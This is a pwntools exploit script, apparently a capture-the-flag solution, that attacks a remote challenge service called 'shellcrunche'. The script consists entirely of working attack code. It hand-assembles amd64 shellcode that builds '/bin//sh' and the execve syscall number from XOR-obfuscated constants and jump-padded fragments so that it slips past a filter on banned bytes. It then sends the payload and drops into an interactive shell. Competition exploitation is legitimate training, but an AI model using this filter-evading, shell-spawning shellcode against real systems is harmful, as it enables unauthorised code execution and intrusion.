#!/usr/bin/env python3
from pwn import *
import warnings
warnings.filterwarnings("ignore")
exe = ELF("./shellcrunche")
# context.log_level='debug'
p = remote("chal.competitivecyber.club", 3004)
# p = process([exe.path])
def gdbs():
    context.terminal = ["foot"]
    gdb.attach(p, gdbscript="""
    

               """)
    # p = gdb.debug([exe.path],"""
    #
    #                 """)

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
shellcode = asm("""
                jmp lmao
                nop
                ret
                nop
                ret
                lmao:
                    mov al,0x3a
                    inc al
                jmp lmao2
                nop 
                ret
                nop
                ret
                nop
                ret
                lmao2:
                    mov edi, 0x43829348
                    jmp lmao3
                    nop
                    ret
                    nop
                    ret
                    nop
                    ret
                    nop
                    ret
                    nop
                    ret
                    nop
                    ret
                    nop
                    ret
                    nop
                    ret
                    nop
                lmao3:      
                    xor edi,0x2bf1bc67
                    jmp lmao4
                    nop
                    ret
                    nop
                    ret
                lmao4:
                    shl rdi,32
                    jmp lmao5
                    nop
                    ret
                    nop
                    ret
                    nop
                    ret
                lmao5:
                    mov edx,0x405d030c
                    jmp lmao6
                    nop
                    ret
                    nop
                    ret
                    nop
                lmao6:
                    xor edx,0x2e346123
                    jmp lmao7
                    nop
                    ret
                    nop
                    ret
                lmao7:
                    or rdi,rdx
                    push r9
                    push rdi
                    jmp lmao8
                    nop
                    ret
                    nop
                    ret
                lmao8:
                    mov rdi,rsp
                    xor rdx,rdx
                    jmp lmao9
                    nop
                    ret
                    nop
                    ret
                lmao9:
                    xor rsi,rsi
                    syscall
                    nop
                    ret
                    nop
                    ret
                    nop
                    ret
                    nop
                    ret
                    nop
                    ret
                    nop

                """,arch="amd64")
print(f"debug: {shellcode}")
buffer = shellcode
chunk_size = 1
chunks = [buffer[i:i + chunk_size] for i in range(0, len(buffer), chunk_size)]
print(f"debug: {chunks}")
for i in range(0,len(chunks)-1,4):
    chunks[i]= p8(u8(chunks[i]) ^ u8(chunks[i+1]))
shellcode = b"".join(chunks)
for i in range(len(chunks)):
    if chunks[i] == p8(0x3B) or chunks[i] == p8(0x2F) or chunks[i] == p8(0x62) or chunks[i] == p8(0x69) or chunks[i] == p8(0x6E) or chunks[i] == p8(0x73) or chunks[i] == p8(0x68) or chunks[i]==b"\x00":
        print(f"found invalid: {chunks[i]} with code {hex(u8(chunks[i]))}")
print(f"len(shellcode): {len(shellcode)}")

print(f"debug: {shellcode}")
    
# gdbs()
sla(":",shellcode)





p.interactive()
# good luck pwning :)

